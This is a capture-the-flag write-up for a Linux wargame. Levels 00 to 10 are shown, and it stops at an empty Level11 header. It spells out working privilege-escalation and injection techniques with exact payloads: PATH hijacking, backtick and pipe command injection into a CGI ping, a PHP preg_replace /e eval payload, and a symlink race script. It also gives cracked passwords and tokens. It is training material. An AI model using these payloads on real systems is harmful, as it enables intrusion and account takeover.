# Level00
I had to find a SUID of the user flag00 so I used the command "find / -perm
-4000 2>/dev/null" in order to find SUIDs and I found one at the path:
	/bin/.../flag00
So I executed it, changed to the user flag00 and ran getflag to finish the level.

# Level01
In the source code the program sets the UID and GUID to those of flag01
and runs the following line:
	system("/usr/bin/env echo and now what?");
The vulnerability here is that the program doesn't use the full path of echo, 
which means it searches for the binary according to the $PATH variable, hence
making it possible for me to execute whatever I want. In that case I added the
directory /home/level01 at the beginning, added a shell script named "echo" that
spawns a shell and executed the program. This granted me a shell as flag01.

# Level02
The program takes the environment variable of $USER, formats it into the string
"/bin/echo %s is so cool" and executes it using system(). In order to spawn a 
shell, I set $USER to \`/bin/bash\`. The ` around /bin/bash mean that it needs
to be evaluated, which causes the program to execute /bin/bash, thus spawning
a shell as flag02.

# Level03
In the level, there is a cron that iterates over a directory and executes every
file in it. I created a shell script that contained the following command:
	getflag > /home/flag03/output
and after a couple of minutes, the output file was created and contained the 
correct output.

# Level04
The program in this level receives a path to a file and prints its contents.
However, if the path contains the string "token" it doesn't print it. 
The solution is to create a symlink to the token file, F.E by this command:
	ln -s /home/level04/link /home/flag04/token
and by executing the flag04 program with the path of the symlink.
This produces the following token:
	06508b5e-8909-4f38-b630-fdb148a848a2

# Level05
In this level I looked at the home directory and at first glance it looked
empty. I used ls -la and saw that I couldn't cd into any folder but the .backup 
so I looked in it and there was a tgz file. I unzipped it using 
tar xvzf <filename> -C <output> and inside the output dir there was a .ssh
folder that contained a private key for flag05. I wrote it to a file and used
ssh -i priv_key flag05@<ip> and I was logged into flag05. I used getflag and it
executed successfully.

# Level06
In this level the hint was that the user uses a legacy unix system for his 
account credentials. I looked in the /etc/passwd and saw that it contained some
sort of a hash as his password. I copied the line for his user and pasted it in
JohnTheRipper and it cracked it as "hello". I used su to log into flag06 with
"hello" as the password and I was logged in. I ran getflag and it ran successfully.

# Level07
In this level we have a cgi file. The file is served by the thttpd dameon with 
the config file of thttpd.conf, which says it listens on port 7007.
The file receives a Host parameter and formats it into the string:
"ping -c 3 {}". This could be exploited for code injection by ending the line
 with a "|" sign and injecting our own code. I browsed to the following link:
	192.168.80.130:7007/index.cgi?Host=127.0.0.1 | getflag
Which executed successfully.

# Level08
In this level we have a pcap file. I downloaded it, opened it in Wireshark and
looked at the TCP stream. We see an authentication process, where the password
is backd00Rmate. I used it for flag08 and was logged in successfully. I ran
getflag and moved on.

# Level09
This program is a wrapper of a PHP code snippet. This snippet takes a path to a file,
reads its content and looks for the following regex pattern:
	/(\[email (.*)\])/
which is the word "email" in square brackets with a space after it and optionally everything after the space.
When it sees this pattern it replaces the email and brackets part of the string with whatever came after the space and calls a function on it. F.E:
	"[email abcd]" -> "spam('abcd')"
The spam() function replaces the "@" sign with the word AT and . with the word "dot".
The vulnerability in the code is that the first regex (the [email ] one) is done with preg_replace with the "e" flag after the expression. It looks like this:
	/(\[email (.*)\])/e
Which means that whatever comes after the replacement will be evaluated. My goal was to make the result include my own code.
At first I wanted to inject code by closing the spam() function and adding a system() call but every quote (double or single) are escaped so that wasn't possible.
My solution was formatting a string with curly brackets and adding `` around my desired code.
The file I used looked like this:
	[email ${`getflag`}]
Which resulted in the execution of getflag.

# Level10
This level contains a program that takes an IP and a file. It checks if the user can open the file and if he can, it sends its contents over a 
socket to the given IP to port 18211. The vulnerability is in the use of the access() system call. The problem is that the program checks if the user can open the file and only later tries to open the file. This could be
exploited by a race condition where access() is called on a file that I have permissions to and then I immediately swap the file with a symlink to the token.
This causes the program to check the permissions to one file and read another.
I wrote a shell script with the following lines:
	
	#!/bin/sh
	n=1
	while [ $n -le 10000 ]
	do
		echo "abc" > /tmp/link
		ln /home/flag10/token /tmp/link -sf
		n=$(( n+1 ))
		rm /tmp/link
	done

and I ran the program with the following command:
	/home/flag10/flag10 /tmp/link 192.168.80.1
After a few tries I received the following token:
	615a2ce1-b2b5-4c76-8eed-8aa5c4015c27

# Level11
